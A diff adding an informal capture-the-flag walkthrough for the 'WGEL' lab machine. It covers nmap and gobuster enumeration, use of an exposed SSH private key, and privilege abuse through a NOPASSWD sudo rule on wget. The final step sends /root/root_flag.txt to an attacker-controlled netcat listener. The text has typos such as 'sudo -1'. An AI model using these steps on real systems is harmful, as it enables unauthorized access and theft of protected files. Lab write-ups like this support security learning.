@@ -1,0 +1,63 @@
+# WGEl CTF To solve it 
+1) nmap scanning 
+	[nmap -sV 10.10.125.255 <=put ip address]
+
+then you'll see ssh open on port 22
+deploy the provided ipt from the machine and try to understand something
+
+2)go for gobuster 
+	[sudo gobuster dir -u http://10.10.125.255/ -w /usr/share/dirb/wordlists/common.txt]
+
+then you wont get anything useful, but we have some thing good like 'sitemap'so
+agin go for gobuster search file download
+
+3)go agin for gobuster search
+	[sudo gobuster dir -u http://10.10.125.255/sitemap/ -w /usr/share/dirb
+wo	rdlists/common.txt]
+wow amazing we found the '.ssh' so we gonna search ' IP/sitemap/.ssh/' on browser,
+then we will fing "id_rsa" and we gona click on it and open then Copying those
+encoded valuse and saving it on our machine and try to see what that file mean
+
+**** may be on new tab
+
+4)write and save the file we copied from browser as key 
+	[vi id_rsa]
+
+5)we gonna give access 
+	[sudo chmod 600 id_rsa]
+
+6)now trying to get into the we have got from source page as 'jessie' as user
+	[sudo ssh -i id_rsa jessie@10.10.125.255]
+WOW! now we are a user
+
+7) let see current working directory
+	[pwd]
+
+8)let see what is inside of it
+	[ls
+	ls -la	uname -a]
+
+9) let's try to search user related fiels
+	 [find / -type f -name "user*" 2>/dev/null]
+
+WOW! we've got it this '/home/jessie/Documents/user_flag.txt'
+
+10)let see what is inside of it
+
+	[cat //home/jessie/Documents/user_flag.txt]
+
+HAHAHO! we found first answer
+
+11) now let try to find next answer 
+	 [sudo -1]
+   we got some useful information this 'User jessie may run the following commands
+   on CorpOne:
+      (ALL : ALL) ALL
+        (root) NOPASSWD: /usr/bin/wget
+      '
+so , now on other tab comand [nc -lvp 4545]
+
+12)so then we gona use post method and try to download the answer
+	[sudo /usr/bin/wget --post-file=/root/root_flag.txt http:/
+10.9.152.133:4545]
+remember we gona use machine ip.
